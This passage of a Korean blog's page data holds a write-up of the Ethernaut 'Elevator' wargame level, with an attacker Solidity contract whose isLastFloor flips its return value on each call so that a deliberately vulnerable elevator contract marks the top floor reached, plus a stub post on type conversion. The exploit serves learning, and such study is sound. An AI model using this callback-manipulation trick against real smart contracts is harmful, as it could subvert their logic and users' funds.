operator\">=</span> <span class=\"token function\">Building</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n        <span class=\"token comment\">// 만약 isLastFloor가 false라면 floor와 top 재설정</span>\r\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> building<span class=\"token punctuation\">.</span><span class=\"token function\">isLastFloor</span><span class=\"token punctuation\">(</span>_floor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> \r\n        floor <span class=\"token operator\">=</span> _floor<span class=\"token punctuation\">;</span>\r\n        top <span class=\"token operator\">=</span> building<span class=\"token punctuation\">.</span><span class=\"token function\">isLastFloor</span><span class=\"token punctuation\">(</span>floor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        <span class=\"token punctuation\">}</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span>\r\n</code></pre></div>\n<hr>\n<p>이번 문제는 굉장히 이해하기 어려웠다. 아무리 봐도 문제 자체를 이해할 수 가 없어서 <a href=\"https://holyhansss.github.io/ethernaut/12_privacy_ethernaut/12_privacy_ethernaut/\">12번 Privacy</a>를 먼저 풀었다ㅋㅋ</p>\n<h3 id=\"풀이를-위한-setup\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4%EB%A5%BC-%EC%9C%84%ED%95%9C-setup\" aria-label=\"풀이를 위한 setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이를 위한 Setup</h3>\n<p><a href=\"https://remix.ethereum.org\">RemixIDE</a>를 사용한다.\r\nremix 사용법은 YouTube와 google에 많이 나와있으니 최신것으로 찾아보자!\r\n그리고 docs를 읽어본다면 사용법을 쉽게 익힐 수 있을 것이다.</p>\n<p>한 가지 주의할 점은 Instance는 remix에서 바로 deploy하는 것이 아니라 ethernaut에서 만든 instance의 주소를 가지고 addressAt을 누르면 된다.\r\n또한 우리는 Rinkeby Network를 사용하고 있으니 ENVIRONMENT를 “Injected Web3”를 선택해주어야 한다.</p>\n<h2 id=\"풀이\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"풀이 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이</h2>\n<p>이 문제에서 우리의 elevator가 top에 갈수 있게 만드는 것이다. 근데 goTo()를 보면 알 수 있다싶이 top이 false일 수 밖에 없게 만들어 두었다. if문이 false일 때만 들어올 수 있기 때문에</p>\n<p>하지만 여기서 주목해야할 점은 interface의 isListFloor이 view 또는 pure가 아니라는 것이다. 즉 우리가 state를 설정해 바꿀 수 있다는 것이다.</p>\n<p>그렇다면 어떻게 바꿀 수 있을까?</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">    Building building <span class=\"token operator\">=</span> <span class=\"token function\">Building</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>위 코드를 보면 알 수 있다시피 msg.sender가 contract여야 한다.</p>\n<p>그렇다면 한번 MyBuilding contract를 보며 깊이 이해해보자!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">MyBuilding</span> <span class=\"token punctuation\">{</span>\r\n    Elevator elevator<span class=\"token punctuation\">;</span>\r\n    <span class=\"token builtin\">bool</span> lastFloor<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _elevator<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        elevator <span class=\"token operator\">=</span> <span class=\"token function\">Elevator</span><span class=\"token punctuation\">(</span>_elevator<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n        lastFloor <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">// interface에서 가져온 function</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">isLastFloor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\r\n        <span class=\"token comment\">// lastFloor이 true 면 false로 false면 true로 바꾼다.</span>\r\n        lastFloor <span class=\"token operator\">=</span> <span class=\"token operator\">!</span>lastFloor<span class=\"token punctuation\">;</span>\r\n        <span class=\"token keyword\">return</span> lastFloor<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token comment\">// elevator의 goTo()를 call한다.</span>\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">goTo</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _floor<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        elevator<span class=\"token punctuation\">.</span><span class=\"token function\">goTo</span><span class=\"token punctuation\">(</span>_floor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Elevator contract의 goTo() if문에서는 build.isLastFloor()이 false여야한다. 하지만 그렇게 되면 top도 false가 될 수 밖에 없기 때문에 isLastFloor()이 불릴때마다 return 값을 바꿔주면 된다. 생각보다 의외로 간단했다. 즉 처음에 if문에서 false를 return하면 top부분에서는 true를 return하게된다.</p>\n<p>그럼 remix에서 MyBuilding contract를 배포하고 goTo()를 실행시키면된다. 나는 11층을 goTo의 parameter로 지정했다.\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 323px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAABJ0AAASdAHeZh94AAAB50lEQVQoz41STW/TQBDdf0Ntx3a89m7Wn7GdYsd2kkql0ADiQCmCShRxQAVVOVe9VXBE4gCFGwdO5Gdw6QVRIDd+xkNex1WB8nF4mjdvZ2c1s49Ydg6bF3B6FagzlNFmheR1ZKKCYQ7QtXPJLTtr6nkJTY/BxAQ9bwJVT8DFCKQucHoluKjAxEiKdVPLyWXDnjeG0R3IB+QZL8DdkaytG0bpDfjhumwo/DWQFTXEJSWQ+JW3uaJFZ7zVV9RWb7Sa1+dE6fShLqFoIVQtOssbLYKi9X/SLoKyvEde3vbwZtvD620fb+8nOL4b4viOi1dbHrIwBxVj2HwIyv6OjpE2DU/2XZzOGL4dlvj+YguLwxyfZwyfZgIbWYV+cQteMAETY3D3YtQ75+4E9QeTnSLAwyrAbhXgQeljt2x5AJel0IwBTGsVxj+g6rEcm1yLQ1yPfWxGLqZ9F5uRwDT2MU1CODSBaqToGIkcSTf/hMFy1yHIxz2OLwc5vh5tYPFsisXzmzg9yHDylONKVoJHV7GaTxH01xtbnRuVnRvZ6Y1gWpdB3t0T+PAowfxJhfnjIeZ7lczf7wiU8RBUTOAFa9KDtaFtXv4GygqYNINupCC0G4GaIajugRp+E80QdjdCR29tE/2Xbeod/gAKA4Vi4vILTwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"elevator_remix_myBuild_contract\"\n        title=\"elevator_remix_myBuild_contract\"\n        src=\"/static/df412da70e7b2bb596a26463f085b4ea/89aeb/elevator_remix_myBuild_contract.png\"\n        srcset=\"/static/df412da70e7b2bb596a26463f085b4ea/e9ff0/elevator_remix_myBuild_contract.png 180w,\n/static/df412da70e7b2bb596a26463f085b4ea/89aeb/elevator_remix_myBuild_contract.png 323w\"\n        sizes=\"(max-width: 323px) 100vw, 323px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>그렇게되면 아래와 같이 floor의 값이 11로 바뀌고 top도 true로 바뀐다.\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 328px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 91.66666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAASCAYAAABb0P4QAAAACXBIWXMAABJ0AAASdAHeZh94AAACaElEQVQ4y52Ty27TQBSG/SIFNjS2Y3t8jx2PnTh27LhJoOGqXlDJpaUIQRcskEpASM2iQt2yREIgBM/Ak7DoAgnxHD+aSSkJalHTxae52f+c/5w5gqY34XhdeNUuvOAmqnQVXvUGXK/D1xW/A8PKUaU9BGGPn7F9P1gFMVK4QQ9JtglFi1ENb0EQJQpVrYHoDRA9BiExtBnYhwyVNKBoU9icISs1EDOH5RSQlQgqSSAsSxRXSzUsXY+wtFzjXFmerq+VIkhyCPG/UJQkCqkccQRNoRhkIUZ5iEHqY5B4GDYD7OQUa40IZS05iSjhKKQBTU/mMVIeLbtAiGyK72Mfx2MHP9528OvdOo4P6vj5xsW3PQqr2kOc3kM9vY+ocZfj+t05HK8Du9KBbmUQXJ3iQ9/Hp34Fnx8n+PKkiY8jiq/DCo7WAhCnzQvjeG2O63dgOgVMp/UXuwViZtyJUJJDKFbOkUiCkhajbGZQrBbKRvM0N7Mwe/8yPQshSHoKe3Mf5uY+6rsTFM8OUdkaw956BfP2HiSZnvPz2ZdwQefBy6ngowOsPj86EXwN687ZgufBqyxyyy1obhtlu4BsFXyuOiunli8qyCNkb4hNWGJZ0n3eKV0YVgaZ2Zm5/cKCkliFWPLnYHuSFMzl7EKCohpDLwbQV4Yw2iOOXgyht7dBkg3eKQtZlowm3O0JnNEE0dMjbBy8h7czgbt7CHv9BSSJLiYoqnXorT4II+/DWBmA5A95xJeKkBdFDmFaGWzWAWYGx2lBYb15qRxyS3Xe9MRoQtNTPpbV+LTCi1k+yRGLgL3J2XGR5/JH8DcM211v7Jc1iwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"elevator_remix_elevator_contract\"\n        title=\"elevator_remix_elevator_contract\"\n        src=\"/static/fc0f98aae0f77f5aed0ef7ae32f7b7d7/d5c60/elevator_remix_elevator_contract.png\"\n        srcset=\"/static/fc0f98aae0f77f5aed0ef7ae32f7b7d7/e9ff0/elevator_remix_elevator_contract.png 180w,\n/static/fc0f98aae0f77f5aed0ef7ae32f7b7d7/d5c60/elevator_remix_elevator_contract.png 328w\"\n        sizes=\"(max-width: 328px) 100vw, 328px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>이후 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!</code></pre></div>\n<hr>\n<h2 id=\"마무리\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"마무리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>마무리</h2>\n<p>다 풀고 생각해보니 내가 interface에 대한 이해가 부족하다는 생각이 든다. ethernaut 덕분에 나의 부족한 점을 하나하나 채워나갈 수 있는 것 같다ㅎㅎ. 지금 생각해보면 openzppline의 ERC token들의 interface들도 잘 이해하지 못했던 것 같다. 한번 ERC token들의 interface도 읽어보며 좀 더 완벽한 이해를 해보자! 또한 view와 pure에 대한 중요성에 대해 깨닫을 수 있던 문제였던것 같다. 이제 거의 절반을 끝냈다. 화이팅 @~@</p>\n<hr>\n<h2 id=\"기타-정보\" style=\"position:relative;\"><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\" aria-label=\"기타 정보 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>기타 정보</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n<li>remix IDE: <a href=\"https://remix.ethereum.org\">https://remix.ethereum.org</a></li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\"></code></pre></div>","frontmatter":{"date":"January 15, 2022","title":"(Ethernaut 취약점 11) Elevator","categories":"취약점분석","author":"한성원","emoji":"🧢"},"fields":{"slug":"/ethernaut/11_elevator_ethernaut/11_elevator_ethernaut/"}},"prev":{"id":"e8bb9d38-750e-5791-9ea2-f3104ba993f5","html":"<h1 id=\"-type-conversion\" style=\"position:relative;\"><a href=\"#-type-conversion\" aria-label=\" type conversion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 Type Conversion</h1>\n<p>Type Conversion에는 2가지 종류가 있다.</p>\n<ul>\n<li>Implicit Conversion</li>\n<li>Explicit Conversion</li>\n</ul>\n<p>우리가 오늘 알아볼 것은 <strong>Explicit Conversion</strong> 이다.\r\n<strong>Explicit Conversion</strong> 은 Ethernaut gatekeeperOne 문제에서 꼭 필요하기 때문에 배우게 되었다!</p>\n<h2 id=\"implicit-conversion\" style=\"position:relative;\"><a href=\"#implicit-conversion\" aria-label=\"implicit conversion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Implicit Conversion</h2>\n<h2 id=\"explicit-conversion\" style=\"position:relative;\"><a href=\"#explicit-conversion\" aria-label=\"explicit conversion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Explicit Conversion</h2>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#implicit-conversion\">Implicit Conversion</a></li>\n<li><a href=\"#explicit-conversion\">Explicit Conversion</a></li>\n</ul>\n</div>","frontmatter":{"date":"January 17, 2022","title":"Type Conversion","categories":"ethereum","author":"한성원","emoji":"🧢"},"fields":{"slug":"/EVM/typecasting/"}},"site":{"siteMetadata":{"siteUrl":"https://holyhansss.github.io","comments":{"utterances":{"repo":""}}}}},"pageContext":{"slug":"/ethernaut/13_gatekeeperOne_ethernaut/13_gatekepperOne_1_ethernaut/","nextSlug":"/ethernaut/11_elevator_ethernaut/11_elevator_ethernaut/","prevSlug":"/EVM/typecasting/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}